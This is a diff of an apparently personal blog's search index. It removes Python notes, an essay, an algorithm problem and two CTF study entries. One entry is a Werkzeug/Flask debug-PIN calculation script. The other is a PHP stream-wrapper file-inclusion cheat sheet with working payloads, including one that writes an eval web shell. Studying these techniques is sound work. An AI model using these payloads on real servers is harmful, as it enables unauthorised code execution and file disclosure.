@@ -590,18 +590,6 @@ print(result)
       </tags>
   </entry>
   <entry>
-    <title>HTML</title>
-    <url>/2023/04/12/htmllearing/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>前端</category>
-      </categories>
-      <tags>
-        <tag>html</tag>
-        <tag>学习</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XSS</title>
     <url>/2023/04/16/XSS/</url>
     <content><![CDATA[<p><a href="https://xss.yt/index/user.html">XSS平台</a></p>
@@ -634,508 +622,6 @@ print(result)
       <tags>
         <tag>web</tag>
         <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python</title>
-    <url>/2023/04/21/python/</url>
-    <content><![CDATA[<h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash">  astr=&quot;python&quot;      //[起始：结束（不包含）：步长]
-  print(astr[0:2])   //py 
-  print(astr[-1])
-  print(astr[::-1])
-</code></pre>
-<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><pre><code class="bash">  alist=[&quot;tom&quot;,&quot;jerry&quot;] //可以写入不同类型的数据
-  alist[0]
-  if name in alist :
-      print(&quot;Yes&quot;);
-</code></pre>
-<h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><pre><code class="bash">  atuple=(&quot;tom&quot;,&quot;jerry&quot;) 
-</code></pre>
-<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><pre><code class="bash">  userdict=&#123;&quot;tom&quot;:&quot;123&quot;,&quot;jerry&quot;:&quot;456&quot;&#125;//字典没有索引值 键值对来取值
-  if name in userdict and password==userdict[username]:
-      print(&quot;Yes&quot;)
-</code></pre>
-<h3 id="文件读取写入"><a href="#文件读取写入" class="headerlink" title="文件读取写入"></a>文件读取写入</h3><blockquote>
-<p>f&#x3D;open(“路径”,”#”)    &#x2F;&#x2F;#&#x3D;rb···</p>
-</blockquote>
-<ul>
-<li><code>close()</code> - 关闭文件，释放相关的系统资源</li>
-<li><code>read(size=-1)</code> - 从文件中读取指定字节数的数据，如果未指定 size 或 size 为负数，则读取整个文件</li>
-<li><code>readline(size=-1)</code> - 从文件中读取一行数据，可以指定最大读取字节数</li>
-<li><code>readlines(hint=-1)</code> - 从文件中读取所有行，并返回一个包含所有行的列表，可以指定最大读取字节数</li>
-<li><code>write(text)</code> - 将指定的文本写入文件</li>
-<li><code>writelines(lines)</code> - 向文件中写入一个字符串列表，不添加行分隔符</li>
-<li><code>seek(offset[, whence])</code> - 改变文件指针的位置，offset 表示相对于 whence 的偏移量，whence 可选值：0（文件开头，默认），1（当前位置），2（文件末尾）</li>
-<li><code>tell()</code> - 返回文件指针的当前位置，相对于文件开头</li>
-<li><code>flush()</code> - 将文件缓冲区的内容写入文件，并清空缓冲区</li>
-<li><code>fileno()</code> - 返回文件的文件描述符（整数）</li>
-<li><code>isatty()</code> - 检查文件是否为终端设备（例如控制台、终端窗口等）</li>
-<li><code>truncate(size=None)</code> - 裁剪文件到指定大小，如果未指定 size，则裁剪到当前文件指针位置</li>
-</ul>
-<h3 id="模块和函数"><a href="#模块和函数" class="headerlink" title="模块和函数"></a>模块和函数</h3><pre><code class="python">    &quot;&quot;&quot;
-    模块作用
-    包含功能
-    other
-    &quot;&quot;&quot;
-    # 变量类型 作用
-    def name():
-        #函数作用 
-        return 
-
-
-    #主程序中：
-    import name
-</code></pre>
-<h3 id="异常捕获"><a href="#异常捕获" class="headerlink" title="异常捕获"></a>异常捕获</h3><pre><code class="python">    try:
-        action
-    except errimfomation:
-        explaination
-    except ···：
-        more 
-</code></pre>
-<h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><p>a example:</p>
-<pre><code class="python">class SKB(object):
-    color = &quot;green&quot;
-    hands = 2
-    def __init__(self,COLOR,HANDS):
-        #初始化
-        self.color=COLOR
-        self.hands=HANDS
-    def dahulu(self):
-        print(&quot;轰······&quot;)
-        #  &quot;number%d&quot; %(number)
-    def jiaobian(self):
-        print(&quot;我没有&quot;)
-    def myaihao(self):
-        print(&quot;傻逼SKB&quot;)
-
-mysheyou = SKB(&quot;green&quot;,2)
-mysheyou.dahulu()
-mysheyou.myaihao()
-mysheyou.jiaobian()
-</code></pre>
-<h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><h4 id="python获取代码"><a href="#python获取代码" class="headerlink" title="python获取代码"></a>python获取代码</h4><pre><code class="python">import urllib.request  
-
-class GetHtml(object):
-    def __init__(self, URL,HEAD):  
-        self.url = URL
-        self.head=HEAD
-
-    def get_index(self):
-        self.request = urllib.request.Request(self.url)
-        self.request.add_header(&quot;user-agent&quot;,self.head)
-        self.response=urllib.request.urlopen(self.request)
-        return self.response.read()
-
-html = GetHtml(&quot;https://siren.blue&quot;,&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;)
-print(html.get_index()) 
-</code></pre>
-<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><pre><code class="python">#re模块
-&quot;&quot;&quot;
-.       单个字符匹配
-[]      括号内的内容会被逐一匹配
-\d      匹配单个数字
-\w      [0-9a-zA-Z]
-\s      空白字符 空格 tab
-*       匹配左邻字符出现0次或多次
-+       左邻字符出现一次或多次
-?       左邻字符出现一次或0次
-&#123;n,m&#125;   左邻字符出现n 到 m次
-^       以什么字符串开头
-$       以什么字符串结尾
-()\\1   括号内保存 分组保存
-&quot;&quot;&quot;
-re.findall(&quot;.x&quot;,&quot;&quot;)
-re.findall(&quot;[Gf]ood&quot;,&quot;&quot;)
-re.findall(&quot;hello&quot;,&quot;&quot;)# 直接匹配
-re.findall(&quot;Good｜food&quot;,&quot;&quot;)
-re.findall(&quot;go*gle&quot;,&quot;i like google not ggle goooogle and gogle&quot;)
-re.findall(&quot;go+gle&quot;,&quot;&quot;)
-re.findall(&quot;style/\w&#123;60&#125;.jpg&quot;,&quot;&quot;)
-</code></pre>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pythonlist</title>
-    <url>/2023/04/21/pythonlist/</url>
-    <content><![CDATA[<h4 id="str"><a href="#str" class="headerlink" title="str"></a>str</h4><ul>
-<li><code>capitalize()</code> - 将字符串的第一个字符大写，其余字符小写</li>
-<li><code>casefold()</code> - 返回一个区分大小写的等效字符串</li>
-<li><code>center(width[, fillchar])</code> - 将字符串居中，使用指定字符填充两侧</li>
-<li><code>count(sub[, start[, end]])</code> - 计算子字符串在字符串中出现的次数</li>
-<li><code>encode(encoding=&#39;utf-8&#39;, errors=&#39;strict&#39;)</code> - 对字符串进行编码</li>
-<li><code>endswith(suffix[, start[, end]])</code> - 检查字符串是否以给定的子字符串结尾</li>
-<li><code>expandtabs(tabsize=8)</code> - 将字符串中的制表符替换为指定数量的空格</li>
-<li><code>find(sub[, start[, end]])</code> - 查找子字符串在字符串中首次出现的位置，如果未找到则返回 -1</li>
-<li><code>format(*args, **kwargs)</code> - 使用指定值替换字符串中的占位符</li>
-<li><code>format_map(mapping)</code> - 使用字典替换字符串中的占位符</li>
-<li><code>index(sub[, start[, end]])</code> - 类似于 find()，但如果未找到子字符串，会引发 ValueError</li>
-<li><code>isalnum()</code> - 检查字符串是否只包含字母和数字</li>
-<li><code>isalpha()</code> - 检查字符串是否只包含字母</li>
-<li><code>isascii()</code> - 检查字符串是否只包含 ASCII 字符</li>
-<li><code>isdecimal()</code> - 检查字符串是否只包含十进制数字</li>
-<li><code>isdigit()</code> - 检查字符串是否只包含数字字符</li>
-<li><code>isidentifier()</code> - 检查字符串是否是有效的 Python 标识符</li>
-<li><code>islower()</code> - 检查字符串中的字母是否都是小写</li>
-<li><code>isnumeric()</code> - 检查字符串是否只包含数值字符</li>
-<li><code>isprintable()</code> - 检查字符串是否只包含可打印字符</li>
-<li><code>isspace()</code> - 检查字符串是否只包含空白字符</li>
-<li><code>istitle()</code> - 检查字符串是否为标题格式（每个单词首字母大写，其余字母小写）</li>
-<li><code>isupper()</code> - 检查字符串中的字母是否都是大写</li>
-<li><code>join(iterable)</code> - 使用字符串作为连接符，将可迭代对象中的元素连接成一个新字符串</li>
-<li><code>ljust(width[, fillchar])</code> - 返回一个左对齐的字符串，并使用指定字符填充右侧</li>
-<li><code>lower()</code> - 将字符串中的所有字符转换为小写</li>
-<li><code>lstrip([chars])</code> - 移除字符串左侧的空白字符或指定字符</li>
-<li><code>maketrans(x[, y[, z]])</code> - 为字符串的 translate() 方法生成一个映射表</li>
-<li><code>partition(sep)</code> - 将字符串分割为一个 3 元组 (head, sep, tail)，head 是分隔符前的子串，sep 是分隔符本身，tail 是分隔符后的子串</li>
-<li><code>replace(old, new[, count])</code> - 将字符串中的 <code>old</code> 替换为 <code>new</code>，可指定替换次数</li>
-<li><code>rfind(sub[, start[, end]])</code> - 查找子字符串在字符串中最后一次出现的位置，如果未找到则返回 -1</li>
-<li><code>rindex(sub[, start[, end]])</code> - 类似于 rfind()，但如果未找到子字符串，会引发 ValueError</li>
-<li><code>rjust(width[, fillchar])</code> - 返回一个右对齐的字符串，并使用指定字符填充左侧</li>
-<li><code>rpartition(sep)</code> - 从右侧开始将字符串分割为一个 3 元组 (head, sep, tail)</li>
-<li><code>rsplit(sep=None, maxsplit=-1)</code> - 从右侧开始使用指定分隔符将字符串拆分为子字符串列表，可指定最大拆分次数</li>
-<li><code>rstrip([chars])</code> - 移除字符串右侧的空白字符或指定字符</li>
-<li><code>split(sep=None, maxsplit=-1)</code> - 使用指定分隔符将字符串拆分为子字符串列表，可指定最大拆分次数</li>
-<li><code>splitlines([keepends])</code> - 将字符串按行拆分为一个列表，可选择是否保留换行符</li>
-<li><code>startswith(prefix[, start[, end]])</code> - 检查字符串是否以给定的子字符串开头</li>
-<li><code>strip([chars])</code> - 移除字符串两端的空白字符或指定字符</li>
-<li><code>swapcase()</code> - 将字符串中的大小写字母互换</li>
-<li><code>title()</code> - 将字符串中的每个单词的首字母大写，其余字母小写</li>
-<li><code>translate(table)</code> - 使用指定的映射表替换字符串中的字符</li>
-<li><code>upper()</code> - 将字符串中的所有字符转换为大写</li>
-<li><code>zfill(width)</code> - 用零填充字符串的左侧，使其达到指定宽度</li>
-</ul>
-<h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><ul>
-<li><code>count(value)</code> - 计算指定值在元组中出现的次数</li>
-<li><code>index(value[, start[, end]])</code> - 返回指定值在元组中首次出现的索引，可以指定查找范围，如果未找到则抛出 ValueError</li>
-</ul>
-<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><ul>
-<li><code>append(item)</code> - 在列表末尾添加一个元素</li>
-<li><code>extend(iterable)</code> - 将一个可迭代对象的元素添加到列表末尾</li>
-<li><code>insert(index, item)</code> - 在指定索引处插入一个元素</li>
-<li><code>remove(value)</code> - 移除列表中首次出现的指定值，如果未找到则抛出 ValueError</li>
-<li><code>pop([index])</code> - 移除并返回指定索引处的元素，默认移除并返回列表最后一个元素</li>
-<li><code>clear()</code> - 移除列表中的所有元素</li>
-<li><code>index(value[, start[, end]])</code> - 返回指定值在列表中首次出现的索引，可以指定查找范围，如果未找到则抛出 ValueError</li>
-<li><code>count(value)</code> - 计算指定值在列表中出现的次数</li>
-<li><code>sort(key=None, reverse=False)</code> - 对列表元素进行排序，可指定排序键和排序顺序</li>
-<li><code>reverse()</code> - 反转列表中的元素顺序</li>
-<li><code>copy()</code> - 返回列表的一个浅拷贝</li>
-</ul>
-<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul>
-<li><code>clear()</code> - 移除字典中的所有元素</li>
-<li><code>copy()</code> - 返回字典的一个浅拷贝</li>
-<li><code>get(key[, default])</code> - 返回字典中指定键的值，如果键不存在，则返回默认值（默认为 None）</li>
-<li><code>items()</code> - 返回一个包含字典所有键值对的视图对象</li>
-<li><code>keys()</code> - 返回一个包含字典所有键的视图对象</li>
-<li><code>values()</code> - 返回一个包含字典所有值的视图对象</li>
-<li><code>pop(key[, default])</code> - 移除并返回字典中指定键的值，如果键不存在，返回默认值（若未提供默认值，抛出 KeyError）</li>
-<li><code>popitem()</code> - 移除并返回字典中的一个键值对（从 Python 3.7 开始，为最后一个键值对），如果字典为空，抛出 KeyError</li>
-<li><code>setdefault(key[, default])</code> - 如果键不存在于字典中，则添加键并设置其值为默认值（默认为 None），返回该键对应的值</li>
-<li><code>update([other])</code> - 将一个字典（或其他可迭代映射类型）的键值对添加到当前字典中，若有重复的键，则覆盖原有键值对</li>
-</ul>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pin</title>
-    <url>/2023/05/13/pin/</url>
-    <content><![CDATA[<pre><code class="python">import hashlib
-from itertools import chain
-probably_public_bits = [
-    &#39;root&#39;,# username
-    &#39;flask.app&#39;,# modname
-    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
-    &#39;/usr/local/lib/python3.11/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
-]
-
-private_bits = [
-    &#39;2485376909614&#39;,# str(uuid.getnode()),  /sys/class/net/ens33/address
-    &#39;003aa46d-e7cb-4f22-8461-4774c3ccf885&#39;# get_machine_id(), /etc/machine-id
-]
-
-h = hashlib.sha1()
-for bit in chain(probably_public_bits, private_bits):
-    if not bit:
-        continue
-    if isinstance(bit, str):
-        bit = bit.encode(&quot;utf-8&quot;)
-    h.update(bit)
-h.update(b&quot;cookiesalt&quot;)
-
-cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;
-
-# If we need to generate a pin we salt it a bit more so that we don&#39;t
-# end up with the same value and generate out 9 digits
-num = None
-if num is None:
-    h.update(b&quot;pinsalt&quot;)
-    num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]
-
-# Format the pincode in groups of digits for easier remembering if
-# we don&#39;t have a result yet.
-rv = None
-if rv is None:
-    for group_size in 5, 4, 3:
-        if len(num) % group_size == 0:
-            rv = &quot;-&quot;.join(
-                num[x : x + group_size].rjust(group_size, &quot;0&quot;)
-                for x in range(0, len(num), group_size)
-            )
-            break
-    else:
-        rv = num
-
-print(rv)
-</code></pre>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>动态规划(一)</title>
-    <url>/2023/04/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B8%80/</url>
-    <content><![CDATA[<blockquote>
-<p>注：本文思路来源于左程云老师</p>
-</blockquote>
-<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2>]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>动态规划</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>伪协议</title>
-    <url>/2023/05/12/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h3 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F; 协议"></a>file:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：<br>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen与allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。<br>说明：<br>file:&#x2F;&#x2F; 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()，include_path</code> 会可选地搜索，也作为相对的路径。<br>用法：</p>
-<pre><code class="bash">/path/to/file.ext
-relative/path/to/file.ext
-fileInCwd.ext
-C:/path/to/winfile.ext
-C:\path\to\winfile.ext
-\\smbserver\share\path\to\winfile.ext
-file:///path/to/file.ext
-</code></pre>
-<p>示例：</p>
-<ul>
-<li>file:&#x2F;&#x2F;[文件的绝对路径和文件名]</li>
-</ul>
-<p><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></p>
-<ul>
-<li>[文件的相对路径和文件名]</li>
-</ul>
-<p><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></p>
-<ul>
-<li>[http：&#x2F;&#x2F;网络路径和文件名]<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></li>
-</ul>
-<h3 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F; 协议"></a>php:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :仅php://input php://stdin php://memory</code><br><code>php://temp 需要on</code><br>作用：<br>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。<br>说明：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
-<p>作用</p>
-<pre><code class="bash">php://input:可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的。
-php://output:只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。
-php://fd:(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。
-php://memory php://temp(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。
-php://filter:(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。
-</code></pre>
-<h4 id="php-x2F-x2F-filter参数详解"><a href="#php-x2F-x2F-filter参数详解" class="headerlink" title="php:&#x2F;&#x2F;filter参数详解"></a>php:&#x2F;&#x2F;filter参数详解</h4><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：<br>php:&#x2F;&#x2F;filter 参数描述</p>
-<ul>
-<li>resource&#x3D;&lt;要过滤的数据流&gt;必须项。它指定了你要筛选过滤的数据流。</li>
-<li>read&#x3D;&lt;读链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（<em>\ </em>）分隔。</li>
-<li>write&#x3D;&lt;写链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（\）分隔。</li>
-<li>&lt;; 两个链的过滤器&gt;任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链。</li>
-</ul>
-<p>可用的过滤器列表（4类）</p>
-<ul>
-<li>字符串过滤器<br>string.rot13 等同于str_rot13()，rot13变换<br>string.toupper 等同于strtoupper()，转大写字母<br>string.tolower 等同于strtolower()，转小写字母<br>string.strip_tags 等同于strip_tags()，去除html、PHP语言标签</li>
-<li>转换过滤器<br>convert.base64-encode &amp; convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码<br>convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码</li>
-<li>压缩过滤器<br>zlib.deflate &amp; zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。<br>bzip2.compress &amp; bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。</li>
-<li>加密过滤器<br>mcrypt.<em>libmcrypt 对称加密算法<br>mdecrypt.</em> libmcrypt 对称解密算法<br>示例：</li>
-</ul>
-<p><code>php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</code></p>
-<p><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></p>
-<p><code>php://input + [POST DATA]执行php代码</code></p>
-<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
-[POST DATA部分]
-&lt;?php phpinfo(); ?&gt;
-图片描述
-</code></pre>
-<p>若有写入权限，写入一句话木马</p>
-<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
-[POST DATA部分]
-&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;
-</code></pre>
-<h3 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。<br>示例：</p>
-<p>zip:&#x2F;&#x2F;[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</p>
-<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
-<p><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></p>
-<p><code>compress.bzip2://file.bz2</code></p>
-<p>压缩 <code>phpinfo.txt</code> 为<code>phpinfo.bz2</code>并上传（同样支持任意后缀名）</p>
-<p><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></p>
-<p><code>compress.zlib://file.gz</code></p>
-<p>压缩<code>phpinfo.txt</code>为<code> phpinfo.gz</code> 并上传（同样支持任意后缀名）</p>
-<p><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></p>
-<h3 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F; 协议"></a>data:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。<br>用法：</p>
-<p><code>data://text/plain,</code><br><code>data://text/plain;base64,</code><br>示例：</p>
-<pre><code class="bash">data://text/plain,
-
-http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
-
-or
-
-data://text/plain;base64,
-
-http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
-</code></pre>
-<h3 id="http-和https-协议"><a href="#http-和https-协议" class="headerlink" title="http://和https://协议"></a><code>http://</code>和<code>https://</code>协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。<br>用法：</p>
-<pre><code class="bash">http://example.com
-http://example.com/file.php?var1=val1&amp;var2=val2
-http://user:password@example.com
-https://example.com
-https://example.com/file.php?var1=val1&amp;var2=val2
-https://user:password@example.com
-</code></pre>
-<p>示例：<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></p>
-<h3 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:&#x2F;&#x2F; 协议"></a>phar:&#x2F;&#x2F; 协议</h3><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
-<p><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>应是天仙狂醉，乱把白云揉碎</title>
-    <url>/2023/04/18/%E5%BA%94%E6%98%AF%E5%A4%A9%E4%BB%99%E7%8B%82%E9%86%89%EF%BC%8C%E4%B9%B1%E6%8A%8A%E7%99%BD%E4%BA%91%E6%8F%89%E7%A2%8E/</url>
-    <content><![CDATA[<blockquote>
-<p>人是一根会思想的苇草</p>
-</blockquote>
-<p>这是一场非正式会谈，我与我的。</p>
-<p>我这一生最讨厌三种人，欺骗、不守约定、孰若无睹，事实上，无比憎恨。</p>
-<p>想必这和我的经历有关，但我也不愿提及，就此散去吧。</p>
-<p>忽然想来，18年来，没有一日不彷徨无知，我还未曾真正瞧过自己一眼，或许瞧过，未曾入眼。</p>
-<p>讨厌的事情总是莫名其妙，就好像我不喜欢下雨，却又喜欢淋雨，或许这就是我的归宿，我也无力改变，但是我又的的确确要做些什么。倘若什么都不做，任由雨打满身，那也有点可悲，我不惧雨淋，不惧湿身，但也要在淋雨时迎风跑起，让那雨更猛烈的捶打着我，下次再遇见这雨，可就亲切又自然了。</p>
-<p>雨淋多了，总是会生病的。可能我也病了，我也不例外，这世界上病的人当然很多，病的千奇百怪，却没有人与我相似。在迷茫中寻求希望，未免是有点天真无知的。我不妄想希望的存在，我想成为自己的希望，千真万确。虽然听起来，更像是妄想。</p>
-<p>我又何尝不知我是在画地为牢，那又如何，属于我的一隅之地，也容许我孤芳自赏，这里不因是我的囚笼，这是我的天堂，我孤身起舞，不辜负我孤傲的人生。</p>
-<blockquote>
-<p>2023 4 18 萃文楼<br> 无法顶格空格的事，姑且下次再谈吧</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>日常</category>
-      </categories>
-      <tags>
-        <tag>不是好事</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>洛谷p1616</title>
-    <url>/2023/04/19/%E6%B4%9B%E8%B0%B7p1616/</url>
-    <content><![CDATA[<h1 id="疯狂的采药"><a href="#疯狂的采药" class="headerlink" title="疯狂的采药"></a>疯狂的采药</h1><h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>此题为纪念 LiYuxiang 而生。</p>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>LiYuxiang 是个天资聪颖的孩子，他的梦想是成为世界上最伟大的医师。为此，他想拜附近最有威望的医师为师。医师为了判断他的资质，给他出了一个难题。医师把他带到一个到处都是草药的山洞里对他说：“孩子，这个山洞里有一些不同种类的草药，采每一种都需要一些时间，每一种也有它自身的价值。我会给你一段时间，在这段时间里，你可以采到一些草药。如果你是一个聪明的孩子，你应该可以让采到的草药的总价值最大。”</p>
-<p>如果你是 LiYuxiang，你能完成这个任务吗？</p>
-<p>此题和原题的不同点：</p>
-<p>$1$. 每种草药可以无限制地疯狂采摘。</p>
-<p>$2$. 药的种类眼花缭乱，采药时间好长好长啊！师傅等得菊花都谢了！</p>
-<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入第一行有两个整数，分别代表总共能够用来采药的时间 $t$ 和代表山洞里的草药的数目 $m$。</p>
-<p>第 $2$ 到第 $(m + 1)$ 行，每行两个整数，第 $(i + 1)$ 行的整数 $a_i, b_i$ 分别表示采摘第 $i$ 种草药的时间和该草药的价值。</p>
-<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行，这一行只包含一个整数，表示在规定的时间内，可以采到的草药的最大总价值。</p>
-<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code>70 3
-71 100
-69 1
-1 2
-</code></pre>
-<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code>140
-</code></pre>
-<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><ul>
-<li>对于 $30%$ 的数据，保证 $m \le 10^3$ 。</li>
-<li>对于 $100%$ 的数据，保证 $1 \leq m \le 10^4$，$1 \leq t \leq 10^7$，且 $1 \leq m \times t \leq 10^7$，$1 \leq a_i, b_i \leq 10^4$。</li>
-</ul>
-<blockquote>
-<p>显然这个一个完全背包问题，对于完全背包问题的求解</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
